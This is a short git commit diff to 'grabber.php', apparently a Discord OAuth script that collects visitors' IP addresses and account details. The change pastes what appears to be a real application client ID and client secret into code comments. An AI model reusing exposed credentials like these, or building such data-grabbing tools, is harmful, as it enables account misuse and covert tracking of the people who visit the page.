94a785bc2ecb5ac6d275d042f8c934a66dda1974
330sway <75238808+330sway@users.noreply.github.com>
2020-11-29 22:16:10 -0800

    Update grabber.php

--- grabber.php
+++ grabber.php
@@ -2,9 +2,9 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
-$client_secret = ""; //CLIENT SECRET HERE
-$redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
+$client_id     = ""; //782850545521000449
+$client_secret = ""; //rgGEonxgOfJb5aORtVcCONuC_uQIOjtY
+$redirect      = ""; //https://discord.com/developers/applications/782850545521000449/oauth2
 
 function get_ip_address()
 {
